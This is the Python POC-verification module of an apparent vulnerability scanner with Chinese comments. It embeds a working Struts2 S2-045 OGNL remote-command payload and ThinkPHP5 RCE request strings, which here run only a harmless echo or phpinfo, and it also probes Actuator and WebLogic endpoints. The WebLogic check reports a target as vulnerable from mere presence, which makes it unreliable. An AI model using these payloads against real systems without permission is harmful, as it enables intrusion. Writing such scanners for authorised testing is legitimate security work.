"""
POC验证模块
用于验证漏洞是否真实存在
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass
from abc import ABC, abstractmethod

from core.base import BaseModule, ScanResult, Severity, ResultType
from core.logger import Logger


@dataclass
class POCResult:
    """POC验证结果"""
    name: str
    vulnerable: bool
    evidence: str
    request: str
    response: str


class BasePOC(ABC):
    """POC基类"""
    
    name: str = "base_poc"
    description: str = "基础POC"
    severity: Severity = Severity.MEDIUM
    
    @abstractmethod
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        """执行POC验证"""
        pass


# ==================== 具体POC实现 ====================

class S2_045_POC(BasePOC):
    """
    Struts2 S2-045 漏洞POC
    CVE-2017-5638
    """
    
    name = "S2-045"
    description = "Apache Struts2 远程代码执行漏洞 (CVE-2017-5638)"
    severity = Severity.CRITICAL
    
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo POC_TEST_SUCCESS').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        
        headers = {
            "Content-Type": payload
        }
        
        try:
            async with session.get(target, headers=headers) as resp:
                content = await resp.text()
                
                if "POC_TEST_SUCCESS" in content:
                    return POCResult(
                        name=self.name,
                        vulnerable=True,
                        evidence="命令执行成功，输出包含POC_TEST_SUCCESS",
                        request=f"GET {target} with Content-Type header",
                        response=content[:500]
                    )
        except Exception as e:
            pass
        
        return POCResult(
            name=self.name,
            vulnerable=False,
            evidence="未检测到漏洞",
            request="",
            response=""
        )


class ThinkPHP5_RCE_POC(BasePOC):
    """
    ThinkPHP5 远程代码执行漏洞POC
    """
    
    name = "ThinkPHP5-RCE"
    description = "ThinkPHP5 远程代码执行漏洞"
    severity = Severity.CRITICAL
    
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        payloads = [
            "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "/?s=index/\\think\\Request/input&filter=phpinfo&data=1",
        ]
        
        for payload in payloads:
            url = target.rstrip('/') + payload
            
            try:
                async with session.get(url) as resp:
                    content = await resp.text()
                    
                    if "PHP Version" in content or "phpinfo()" in content:
                        return POCResult(
                            name=self.name,
                            vulnerable=True,
                            evidence=f"phpinfo执行成功，Payload: {payload}",
                            request=f"GET {url}",
                            response=content[:500]
                        )
            except Exception:
                pass
        
        return POCResult(
            name=self.name,
            vulnerable=False,
            evidence="未检测到漏洞",
            request="",
            response=""
        )


class Spring_Actuator_POC(BasePOC):
    """
    Spring Boot Actuator 未授权访问POC
    """
    
    name = "Spring-Actuator"
    description = "Spring Boot Actuator 未授权访问"
    severity = Severity.HIGH
    
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        endpoints = [
            "/actuator",
            "/actuator/env",
            "/actuator/heapdump",
            "/env",
            "/health",
            "/info",
            "/mappings",
            "/beans",
            "/configprops",
        ]
        
        for endpoint in endpoints:
            url = target.rstrip('/') + endpoint
            
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # 检查是否是有效的actuator响应
                        if any(keyword in content.lower() for keyword in ['"status"', '"contexts"', '"beans"', '"properties"']):
                            return POCResult(
                                name=self.name,
                                vulnerable=True,
                                evidence=f"发现未授权访问端点: {endpoint}",
                                request=f"GET {url}",
                                response=content[:500]
                            )
            except Exception:
                pass
        
        return POCResult(
            name=self.name,
            vulnerable=False,
            evidence="未检测到漏洞",
            request="",
            response=""
        )


class Redis_Unauth_POC(BasePOC):
    """
    Redis 未授权访问POC
    """
    
    name = "Redis-Unauth"
    description = "Redis 未授权访问漏洞"
    severity = Severity.HIGH
    
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        # 这个需要TCP连接，简化处理
        # 实际应该使用socket连接测试
        return POCResult(
            name=self.name,
            vulnerable=False,
            evidence="需要TCP连接测试，请使用端口扫描模块",
            request="",
            response=""
        )


class WebLogic_T3_POC(BasePOC):
    """
    WebLogic T3协议反序列化POC
    """
    
    name = "WebLogic-T3"
    description = "WebLogic T3协议反序列化漏洞"
    severity = Severity.CRITICAL
    
    async def check(self, target: str, session: aiohttp.ClientSession) -> POCResult:
        # 检查WebLogic控制台
        endpoints = [
            "/console/login/LoginForm.jsp",
            "/wls-wsat/CoordinatorPortType",
            "/_async/AsyncResponseService",
        ]
        
        for endpoint in endpoints:
            url = target.rstrip('/') + endpoint
            
            try:
                async with session.get(url) as resp:
                    if resp.status in [200, 401, 403]:
                        content = await resp.text()
                        
                        if "WebLogic" in content or "Oracle" in content:
                            return POCResult(
                                name=self.name,
                                vulnerable=True,
                                evidence=f"发现WebLogic服务，可能存在T3反序列化漏洞",
                                request=f"GET {url}",
                                response=content[:500]
                            )
            except Exception:
                pass
        
        return POCResult(
            name=self.name,
            vulnerable=False,
            evidence="未检测到漏洞",
            request="",
            response=""
        )


class POCScanner(BaseModule):
    """
    POC验证扫描器
    使用已知POC验证漏洞
    """
    
    name = "poc_scanner"
    description = "POC漏洞验证扫描器"
    author = "PySecScanner"
    version = "1.0.0"
    
    # 注册的POC列表
    POC_LIST = [
        S2_045_POC(),
        ThinkPHP5_RCE_POC(),
        Spring_Actuator_POC(),
        Redis_Unauth_POC(),
        WebLogic_T3_POC(),
    ]
    
    def __init__(self, config=None, logger=None):
        super().__init__(config, logger)
        self.timeout = 15
        self.concurrency = 5
        self.results: List[POCResult] = []
    
    async def scan(self, target: str) -> List[ScanResult]:
        """
        执行POC扫描
        
        Args:
            target: 目标URL
        """
        self.base_url = self._normalize_url(target)
        if not self.base_url:
            self.logger.error(f"无效的URL: {target}")
            return []
        
        self.logger.info(f"目标URL: {self.base_url}")
        self.logger.info(f"加载POC: {len(self.POC_LIST)} 个")
        
        # 执行POC验证
        self.results = await self._run_pocs()
        
        # 生成结果
        scan_results = []
        
        for result in self.results:
            if result.vulnerable:
                scan_result = ScanResult(
                    result_type=ResultType.VULNERABILITY,
                    title=f"POC验证成功: {result.name}",
                    description=f"漏洞 {result.name} 验证通过，存在真实漏洞",
                    severity=Severity.CRITICAL,
                    target=self.base_url,
                    evidence=f"证据: {result.evidence}\n\n请求:\n{result.request}\n\n响应:\n{result.response[:500]}",
                    raw_data=result.__dict__
                )
                scan_results.append(scan_result)
                self.add_result(scan_result)
        
        # 打印结果
        vulnerable = [r for r in self.results if r.vulnerable]
        if vulnerable:
            self.logger.print_result(
                "验证通过的漏洞",
                [f"{r.name} - {r.evidence[:50]}" for r in vulnerable]
            )
        else:
            self.logger.info("未发现可验证的漏洞")
        
        return scan_results
    
    def _normalize_url(self, url: str) -> str:
        """规范化URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    async def _run_pocs(self) -> List[POCResult]:
        """运行所有POC"""
        results = []
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for poc in self.POC_LIST:
                try:
                    self.logger.info(f"测试POC: {poc.name}")
                    result = await poc.check(self.base_url, session)
                    results.append(result)
                    
                    if result.vulnerable:
                        self.logger.highlight(f"发现漏洞: {poc.name}")
                        
                except Exception as e:
                    self.logger.warning(f"POC {poc.name} 执行失败: {e}")
        
        return results
    
    @classmethod
    def register_poc(cls, poc: BasePOC) -> None:
        """注册新的POC"""
        cls.POC_LIST.append(poc)
    
    @classmethod
    def get_poc_list(cls) -> List[str]:
        """获取POC列表"""
        return [poc.name for poc in cls.POC_LIST]
